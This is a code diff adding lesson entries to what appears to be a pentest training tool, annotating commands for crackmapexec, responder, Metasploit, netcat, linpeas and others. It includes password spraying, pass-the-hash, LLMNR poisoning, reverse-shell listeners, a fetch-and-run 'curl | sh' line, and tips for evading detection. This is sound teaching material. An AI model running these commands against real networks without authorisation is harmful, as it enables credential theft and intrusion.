@@ -261,6 +261,18 @@ LESSONS = {
         ],
         "next": ["exploit the CVE (searchsploit/metasploit)", "manual verification (curl/burp)", "report generation"],
         "caution": "Some templates send active exploit payloads. Use -severity info,low for passive-only.",
+        "cia": [
+            "CONFIDENTIALITY — primary. Templates surface exposures (open dashboards, info leaks, default creds) that expose data.",
+            "INTEGRITY — high. CVE templates confirm known RCE/injection bugs that let an attacker alter the system.",
+            "AVAILABILITY — caution. Some templates fire real exploit payloads; against fragile targets that can crash a service. Filter with -severity to stay light.",
+        ],
+        "anatomy_cmd": "nuclei -u http://target.com -t http/ -severity critical,high",
+        "anatomy": {
+            "nuclei":         "The binary.",
+            "-u http://target.com": "TARGET URL. SOURCE: a live web host from nmap, a subdomain from subfinder. Use -l targets.txt for many.",
+            "-t http/":       "TEMPLATE set to run. SOURCE: the built-in template library (~/nuclei-templates/, kept fresh with -update-templates). You narrow it by tech you fingerprinted (e.g. -t http/cves/).",
+            "-severity critical,high": "FILTER — your choice. Limits to high-impact templates: fewer requests, more signal, quieter.",
+        },
     },
 
     "whatweb": {
@@ -283,6 +295,17 @@ LESSONS = {
         ],
         "next": ["searchsploit (identified CMS/versions)", "wpscan (WordPress)", "nikto/nuclei (full scan)"],
         "caution": "Aggression level 4 will POST data and may leave traces in app logs.",
+        "cia": [
+            "CONFIDENTIALITY — indirect. Fingerprinting itself reads public banners; the value is knowing WHICH stack to attack for data later.",
+            "INTEGRITY — indirect. Identifying an exact CMS/version points you to the known bug that enables tampering.",
+            "AVAILABILITY — minimal. At -a 1 it's one request (near-invisible). -a 4 POSTs data and is louder, but still doesn't break things.",
+        ],
+        "anatomy_cmd": "whatweb http://target.com -a 1",
+        "anatomy": {
+            "whatweb":        "The binary.",
+            "http://target.com": "TARGET URL. SOURCE: a live web host from nmap, or a subdomain from subfinder/amass. Scheme matches the open port.",
+            "-a 1":           "AGGRESSION (1-4). YOUR stealth dial: -a 1 = a single passive-looking request (recon-first), -a 3+ = active probing that touches the app more.",
+        },
     },
 
     "enum4linux": {
@@ -308,6 +331,17 @@ LESSONS = {
         ],
         "next": ["crackmapexec (test creds on discovered users)", "smbclient (mount shares)", "hydra (brute user list)"],
         "caution": "RID cycling (-r) generates lots of traffic and may trigger IDS.",
+        "cia": [
+            "CONFIDENTIALITY — primary. Null-session enumeration leaks users, shares, and policy that should require auth to see.",
+            "INTEGRITY — secondary. Accessible shares it finds may be writable, enabling tampering or payload drops.",
+            "AVAILABILITY — low, but -r (RID cycling) is chatty and can trip IDS, indirectly inviting a defensive lockout response.",
+        ],
+        "anatomy_cmd": "enum4linux -a 192.168.1.100",
+        "anatomy": {
+            "enum4linux":     "The binary.",
+            "-a":             "ALL enumeration (users+shares+groups+policy+RID). Your breadth choice; -U alone is quieter.",
+            "192.168.1.100":  "TARGET host running SMB. SOURCE: nmap showing port 139/445 open. Must be a Windows/Samba box for anything to come back.",
+        },
     },
 
     "crackmapexec": {
@@ -339,6 +373,20 @@ LESSONS = {
         ],
         "next": ["evil-winrm (if WinRM open)", "mimikatz (dump hashes)", "bloodhound (map the domain)"],
         "caution": "Password spraying with wrong timing will lock out accounts. Check password policy first.",
+        "cia": [
+            "CONFIDENTIALITY — primary. Valid creds + --shares/--sam/--ntds reads data and secrets across many hosts at once.",
+            "INTEGRITY — high. -x/-X execute commands on every box you own — full ability to modify those systems.",
+            "AVAILABILITY — real risk. Spraying without checking the lockout policy locks out real accounts (a self-inflicted DoS). Check policy FIRST.",
+        ],
+        "anatomy_cmd": "crackmapexec smb 192.168.1.0/24 -u admin -p 'Spring2026!'",
+        "anatomy": {
+            "crackmapexec":   "The binary.",
+            "smb":            "PROTOCOL. SOURCE: which service is open (smb/winrm/ssh/rdp) — from nmap. SMB is the AD workhorse.",
+            "192.168.1.0/24": "TARGET range (CIDR). SOURCE: your scope / the subnet nmap revealed. Sweeps every host in the block.",
+            "-u admin":       "USERNAME. SOURCE: enum4linux user list, a cracked cred, a known default. -u users.txt for a list.",
+            "-p 'Spring2026!'": "PASSWORD. SOURCE: a hashcat crack, responder capture→crack, an OSINT guess, or a default. Spray ONE password across users to avoid lockouts.",
+            "(pass-the-hash)": "ALT: -H <ntlm-hash> instead of -p uses a hash you dumped — no plaintext needed.",
+        },
     },
 
     "ffuf": {
@@ -369,6 +417,19 @@ LESSONS = {
         ],
         "next": ["curl/browser (inspect findings)", "sqlmap (if parameter fuzzing found injection)"],
         "caution": "High thread counts can DoS unstable applications. Start at -t 25.",
+        "cia": [
+            "CONFIDENTIALITY — primary. Discovers hidden endpoints, params, and vhosts that expose data or admin surface.",
+            "INTEGRITY — secondary. A fuzzed-out upload/API endpoint can become the path to modifying the app.",
+            "AVAILABILITY — real. ffuf is FAST; high -t against a fragile app is effectively a load test. Throttle with -rate / lower -t.",
+        ],
+        "anatomy_cmd": "ffuf -u http://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200,301,302",
+        "anatomy": {
+            "ffuf":           "The binary.",
+            "-u .../FUZZ":    "TARGET URL with the FUZZ keyword marking the INJECTION POINT. The word 'FUZZ' is replaced by each wordlist entry — it can sit in the path, a param, or a header.",
+            "FUZZ":           "The placeholder. YOU position it wherever you want to fuzz (path vs ?param=FUZZ vs Host: FUZZ).",
+            "-w /usr/share/seclists/...": "WORDLIST. SOURCE: SecLists (the standard) or Kali's dirb lists. Match the list to the goal — Web-Content for dirs, DNS lists for vhosts.",
+            "-mc 200,301,302": "MATCH these status codes (your signal filter). Pair with -fc/-fs to hide noise.",
+        },
     },
 
     "metasploit": {
@@ -400,6 +461,19 @@ LESSONS = {
         ],
         "next": ["hashdump", "getsystem", "run post/multi/recon/local_exploit_suggester", "persistence"],
         "caution": "Exploits can crash services and systems. Test on snapshots. Log every action.",
+        "cia": [
+            "CONFIDENTIALITY — primary. A meterpreter session reads any data the compromised account can reach.",
+            "INTEGRITY — primary. Code execution = full ability to modify files, configs, and other systems from the beachhead.",
+            "AVAILABILITY — real risk. Memory-corruption exploits can crash the target service or whole box. Test on snapshots; know the exploit's reliability rating.",
+        ],
+        "anatomy_cmd": "use exploit/...; set RHOSTS <target>; set LHOST <you>; set PAYLOAD ...; run",
+        "anatomy": {
+            "use exploit/...": "MODULE — chosen from 'search <CVE>'. SOURCE: a CVE that nmap/nuclei/searchsploit flagged for the target's exact version.",
+            "RHOSTS":         "REMOTE host = the TARGET. SOURCE: nmap. The victim you're exploiting.",
+            "LHOST":           "LOCAL host = YOUR attacker IP the reverse shell calls back to. SOURCE: 'ip a' (eth0/tun0). Beginners' #1 mistake: setting this to localhost instead of their reachable IP.",
+            "LPORT":           "Port your handler listens on — YOUR choice (443/53 blend with normal egress).",
+            "PAYLOAD":         "What runs on success. reverse_tcp = victim calls YOU (works through NAT); bind = you call the victim. Match arch (x64) to the target.",
+        },
     },
 
     "bloodhound": {
@@ -423,6 +497,19 @@ LESSONS = {
         ],
         "next": ["impacket-GetUserSPNs (Kerberoast)", "impacket-secretsdump (DCSync)", "mimikatz (local hashes)"],
         "caution": "SharpHound on-domain is noisier than bloodhound-python off-domain.",
+        "cia": [
+            "CONFIDENTIALITY — primary. Maps who-can-reach-what across AD, exposing the privilege relationships that guard sensitive data.",
+            "INTEGRITY — high. The attack PATHS it reveals (WriteDACL, GenericAll) are exactly the rights to modify objects and escalate.",
+            "AVAILABILITY — low. Collection is LDAP queries (read-only); the noise risk is detection, not disruption. -c DCOnly is the quietest.",
+        ],
+        "anatomy_cmd": "bloodhound-python -u user -p pass -d domain.local -ns <DC-IP> -c All",
+        "anatomy": {
+            "bloodhound-python": "The collector (off-domain, runs from YOUR box — leaves no agent on the target).",
+            "-u user -p pass":"DOMAIN CREDENTIALS. SOURCE: any valid creds you already obtained — responder→crack, password spray hit, or provided for the engagement. BloodHound needs at least one foothold account.",
+            "-d domain.local":"DOMAIN NAME. SOURCE: enum4linux, the DC's LDAP, or nmap's hostname output.",
+            "-ns <DC-IP>":    "NAME SERVER = the Domain Controller's IP. SOURCE: nmap (the host with 88/389/445 open is usually the DC).",
+            "-c All":         "Collection method. 'All' is thorough but louder; '-c DCOnly' queries just the DC and is the stealthiest.",
+        },
     },
 
     "hashcat": {
@@ -486,6 +573,19 @@ LESSONS = {
         ],
         "next": ["hashcat -m 5600 (crack NTLMv2)", "ntlmrelayx (relay instead of cracking)", "crackmapexec"],
         "caution": "LLMNR poisoning will disrupt legitimate network traffic. LAN attacks only with permission.",
+        "cia": [
+            "CONFIDENTIALITY — primary. Capturing NTLMv2 hashes off the wire harvests credentials that protect data across the whole domain.",
+            "INTEGRITY — high (via relay). With ntlmrelayx those captured auths can be relayed to modify systems, not just read.",
+            "AVAILABILITY — caution. Poisoning answers to LLMNR/NBT-NS broadcasts disrupts legitimate name resolution on the LAN — you can break things for real users.",
+        ],
+        "anatomy_cmd": "responder -I eth0 -wF",
+        "anatomy": {
+            "responder":      "The binary.",
+            "-I eth0":        "INTERFACE to listen/poison on. SOURCE: 'ip a' or 'ifconfig' — pick the NIC on the target LAN segment (eth0, wlan0, etc.). Wrong interface = you hear nothing.",
+            "-w":             "Enable the WPAD rogue proxy — your choice, increases catch rate.",
+            "-F":             "Force NTLM auth in WPAD responses — your choice. Combined as -wF.",
+            "(no target)":    "NOTE: responder has NO target argument — it's PASSIVE-ish, answering broadcasts that victims send on their own. You position on the segment; the victims come to you.",
+        },
     },
 
     "linpeas": {
@@ -506,6 +606,18 @@ LESSONS = {
         ],
         "next": ["gtfobins exploit (SUID)", "sudo exploitation", "CVE search (found kernel version)"],
         "caution": "LinPEAS creates lots of log entries — assume your presence is being recorded.",
+        "cia": [
+            "CONFIDENTIALITY — secondary. It reads config/files to FIND privesc paths; the data exposure is the payoff after you escalate.",
+            "INTEGRITY — primary goal. The whole point is finding a path to root, i.e. the power to modify ANYTHING on the box.",
+            "AVAILABILITY — none directly. It's a read-only enumeration script; it doesn't change or break the system itself.",
+        ],
+        "anatomy_cmd": "curl -L https://.../linpeas.sh | sh",
+        "anatomy": {
+            "curl -L ...":    "FETCH the script over the network. SOURCE: the PEASS-ng GitHub releases URL. -L follows redirects.",
+            "| sh":           "PIPE straight into the shell so it runs IN MEMORY — no file written to disk (quieter, leaves less forensic trace).",
+            "(runs locally)": "PREREQUISITE: you must ALREADY have a shell on the target (from a reverse shell, SSH, etc.). linpeas runs ON the victim, enumerating from the inside — it has no 'target' argument.",
+            "alt: ./linpeas.sh": "If no internet on the box, you transfer the .sh file first (scp/nc/python http.server) then run it.",
+        },
     },
 
     "netcat": {
@@ -529,6 +641,19 @@ LESSONS = {
         ],
         "next": ["python pty (upgrade shell)", "socat (encrypted shell)", "chisel (tunneling)"],
         "caution": "nc shells are fragile and unencrypted. Upgrade to a pty immediately.",
+        "cia": [
+            "CONFIDENTIALITY — secondary. The shell/transfer it provides is the channel through which data is read or exfiltrated.",
+            "INTEGRITY — primary. A reverse shell is interactive control of the target — full ability to modify the system.",
+            "AVAILABILITY — low. netcat itself moves bytes; it doesn't degrade service (though what you DO with the shell might).",
+        ],
+        "anatomy_cmd": "nc -lvnp 4444",
+        "anatomy": {
+            "nc":             "The binary (netcat).",
+            "-l":             "LISTEN mode — you're the server waiting for the victim to connect back (a reverse shell).",
+            "-v -n":          "Verbose + no-DNS. Your convenience flags.",
+            "-p 4444":        "LISTEN PORT — YOUR choice, but it must MATCH the port baked into the payload/reverse-shell one-liner you ran on the victim. Pick 443/53 to blend with normal egress.",
+            "(your IP)":      "IMPLICIT: the victim's reverse-shell command points at YOUR attacker IP:port. SOURCE of that IP: 'ip a' on your box, or the tun0 IP on a VPN/HTB.",
+        },
     },
 
     # ══════════════════════════════════════════════════════════════
